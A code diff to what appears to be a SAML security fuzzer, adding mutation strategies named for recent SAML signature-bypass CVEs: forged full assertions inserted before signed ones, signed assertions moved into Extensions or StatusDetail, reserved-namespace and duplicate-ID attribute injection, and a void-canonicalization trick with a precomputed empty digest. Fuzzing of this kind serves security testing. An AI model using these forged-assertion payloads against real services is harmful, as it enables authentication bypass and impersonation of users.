@@ -257,6 +257,59 @@ XSLT_PAYLOADS = [
     ),
 ]
 
+# ── Full-structure evil assertion (G1: CVE-2026-25922) ────────────
+
+XSW_FULL_EVIL_ASSERTION_TEMPLATE = (
+    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
+    b' Version="2.0" ID="_evil_{EVIL_ID}"'
+    b' IssueInstant="2026-01-01T00:00:00Z">'
+    b"<saml:Issuer>https://idp.example.com</saml:Issuer>"
+    b"<saml:Subject>"
+    b'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
+    b"{EVIL_NAMEID}</saml:NameID>"
+    b'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
+    b'<saml:SubjectConfirmationData NotOnOrAfter="2030-12-31T23:59:59Z"'
+    b' Recipient="https://sp.example.com/acs"/>'
+    b"</saml:SubjectConfirmation>"
+    b"</saml:Subject>"
+    b'<saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">'
+    b"<saml:AudienceRestriction>"
+    b"<saml:Audience>https://sp.example.com</saml:Audience>"
+    b"</saml:AudienceRestriction>"
+    b"</saml:Conditions>"
+    b'<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">'
+    b"<saml:AuthnContext>"
+    b"<saml:AuthnContextClassRef>"
+    b"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
+    b"</saml:AuthnContextClassRef>"
+    b"</saml:AuthnContext>"
+    b"</saml:AuthnStatement>"
+    b"</saml:Assertion>"
+)
+
+# ── Reserved NS attributes (G3: CVE-2025-66567) ──────────────────
+
+RESERVED_NS_ATTRS = [
+    b' xml:xmlns="http://www.w3.org/2000/09/xmldsig#"',
+    b' xml:xmlns="urn:oasis:names:tc:SAML:2.0:assertion"',
+    b' xmlns:xml="http://www.w3.org/XML/1998/namespace"',
+    b' xml:xmlns="#"',
+]
+
+# ── Namespace-prefixed duplicate ID attrs (G5: Fragile Lock) ──────
+
+NS_PREFIXED_ID_ATTRS = [
+    b' saml:ID="_evil_dup"',
+    b' samlp:ID="_evil_dup"',
+    b' ds:ID="_evil_dup"',
+    b' xsi:ID="_evil_dup"',
+]
+
+# ── StatusDetail wrapper for G2 (CVE-2025-54369) ─────────────────
+
+XSW_STATUSDETAIL_PREFIX = b"<samlp:StatusDetail>"
+XSW_STATUSDETAIL_SUFFIX = b"</samlp:StatusDetail>"
+
 # ── Regex patterns for locating XML elements ─────────────────────
 
 _RE_ASSERTION_OPEN = re.compile(
@@ -457,6 +510,12 @@ class SamlMutator:
             self._libxml2_id_caching,             # 47
             self._assertion_count_bomb,           # 48  NEW
             self._go_encoding_xml_quirk,          # 49  NEW
+            # ── G: CVE Gap Strategies ──
+            self._xsw_first_assertion_extract,   # 50  CVE-2026-25922
+            self._xsw_signed_in_extensions,      # 51  CVE-2025-54369
+            self._reserved_ns_attr_inject,       # 52  CVE-2025-66567
+            self._void_c14n_precomputed_digest,  # 53  CVE-2025-66568
+            self._ns_prefixed_attr_dup,          # 54  Fragile Lock
         ]
         self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
         self._weights: list[int] = [
@@ -476,6 +535,8 @@ class SamlMutator:
             2,
             # S8: Implementation-specific (original + new)
             4, 4, 4, 3, 5, 6,
+            # G: CVE Gap strategies
+            8, 7, 6, 7, 6,
         ]
         assert len(self._strategies) == len(self._weights)
 
@@ -1450,4 +1511,153 @@ class SamlMutator:
         pos = m.end() - 1  # before closing >
         return bytearray(
             bytes(data[:pos]) + payload + bytes(data[pos:])
+        )
+
+    # ══════════════════════════════════════════════════════════════
+    # G: CVE Gap Strategies (2025-2026 recently discovered vectors)
+    # ══════════════════════════════════════════════════════════════
+
+    def _xsw_first_assertion_extract(self, data: bytearray) -> bytearray | None:
+        """CVE-2026-25922: First-assertion extraction attack.
+
+        Insert a full-structure evil assertion BEFORE the signed one.
+        Unlike basic XSW1 (minimal evil assertion), this creates a
+        complete assertion with Issuer, Conditions, AuthnStatement
+        so it passes "looks like a valid assertion" heuristics.
+        Libraries that validate the signed assertion but then extract
+        the first assertion from the document are vulnerable.
+        """
+        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
+        if not span:
+            return None
+        evil_id = self.rng.randbytes(8).hex().encode()
+        nameid = self.rng.choice(EVIL_NAMEIDS)
+        evil = (
+            XSW_FULL_EVIL_ASSERTION_TEMPLATE
+            .replace(b"{EVIL_ID}", evil_id)
+            .replace(b"{EVIL_NAMEID}", nameid)
+        )
+        return bytearray(
+            bytes(data[: span[0]]) + evil + b"\n" + bytes(data[span[0] :])
+        )
+
+    def _xsw_signed_in_extensions(self, data: bytearray) -> bytearray | None:
+        """CVE-2025-54369: Post-validation document extraction.
+
+        Move the signed assertion into <samlp:Extensions> or <samlp:StatusDetail>,
+        then insert an unsigned evil assertion in the original position.
+        Libraries that validate the signature (finding it in Extensions) but
+        extract assertions from the Response root are vulnerable.
+        """
+        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
+        if not span:
+            return None
+        signed_block = bytes(data[span[0] : span[1]])
+        evil = _make_evil_assertion(self.rng)
+
+        # Choose container: Extensions or StatusDetail
+        if self.rng.random() < 0.5:
+            wrapper = XSW_EXTENSIONS_PREFIX + signed_block + XSW_EXTENSIONS_SUFFIX
+        else:
+            wrapper = XSW_STATUSDETAIL_PREFIX + signed_block + XSW_STATUSDETAIL_SUFFIX
+
+        # Find insertion point: after </samlp:Status>
+        status_close = data.find(b"</samlp:Status>")
+        if status_close < 0:
+            return None
+        insert_pos = status_close + len(b"</samlp:Status>")
+
+        # Replace signed assertion with evil, insert wrapper after Status
+        result = (
+            bytes(data[: span[0]])
+            + evil
+            + bytes(data[span[1] : insert_pos])
+            + b"\n"
+            + wrapper
+            + bytes(data[insert_pos:])
+        )
+        # Fix: if span was before insert_pos we need to adjust for removed bytes
+        # Simpler approach: reconstruct from before assertion
+        before = bytes(data[: span[0]])
+        after_assertion = bytes(data[span[1] :])
+        status_close2 = after_assertion.find(b"</samlp:Status>")
+        if status_close2 < 0:
+            # Status was before assertion
+            return bytearray(
+                before + evil + after_assertion
+            )
+        insert2 = status_close2 + len(b"</samlp:Status>")
+        return bytearray(
+            before
+            + evil
+            + after_assertion[:insert2]
+            + b"\n"
+            + wrapper
+            + after_assertion[insert2:]
+        )
+
+    def _reserved_ns_attr_inject(self, data: bytearray) -> bytearray | None:
+        """CVE-2025-66567: Reserved namespace attribute injection.
+
+        Add xml:xmlns='...' or xmlns:xml='...' to Signature or Assertion.
+        REXML treats these as regular attributes; Nokogiri/libxml2 treats
+        them as reserved (ignores or errors). This makes the Signature
+        visible to one parser but invisible to another.
+        """
+        # Choose target: Signature or Assertion
+        if self.rng.random() < 0.5:
+            target_re = _RE_SIGNATURE_OPEN
+        else:
+            target_re = _RE_ASSERTION_OPEN
+        m = target_re.search(data)
+        if not m:
+            return None
+        attr = self.rng.choice(RESERVED_NS_ATTRS)
+        pos = m.end() - 1  # before closing >
+        return bytearray(
+            bytes(data[:pos]) + attr + bytes(data[pos:])
+        )
+
+    def _void_c14n_precomputed_digest(self, data: bytearray) -> bytearray | None:
+        """CVE-2025-66568: Void canonicalization with precomputed digest.
+
+        Inject a relative namespace URI (e.g., xmlns:ns="1") to trigger
+        canonicalization failure (empty string output), then replace
+        DigestValue with SHA-256("") so the digest validates against
+        the empty canonical form.
+        """
+        # Step 1: Inject relative NS on Assertion
+        m = _RE_ASSERTION_OPEN.search(data)
+        if not m:
+            return None
+        ns_attr = b' xmlns:voidns="1"'
+        pos = m.end() - 1
+        result = bytes(data[:pos]) + ns_attr + bytes(data[pos:])
+
+        # Step 2: Replace DigestValue with precomputed empty digest
+        m_dv = _RE_DIGEST_VALUE.search(result)
+        if not m_dv:
+            return bytearray(result)  # at least inject the NS
+        return bytearray(
+            result[: m_dv.start(1)]
+            + EMPTY_SHA256_B64
+            + result[m_dv.end(1) :]
+        )
+
+    def _ns_prefixed_attr_dup(self, data: bytearray) -> bytearray | None:
+        """PortSwigger Fragile Lock: Namespace-prefixed attribute duplication.
+
+        Add a namespace-prefixed duplicate of the ID attribute on Assertion
+        (e.g., saml:ID="_evil"). Different parsers resolve the ID differently:
+        - libxml2: declaration order based
+        - REXML: namespace-aware vs unaware lookup differs
+        This creates a Reference URI mismatch across parser implementations.
+        """
+        m = _RE_ASSERTION_OPEN.search(data)
+        if not m:
+            return None
+        attr = self.rng.choice(NS_PREFIXED_ID_ATTRS)
+        pos = m.end() - 1  # before closing >
+        return bytearray(
+            bytes(data[:pos]) + attr + bytes(data[pos:])
         )
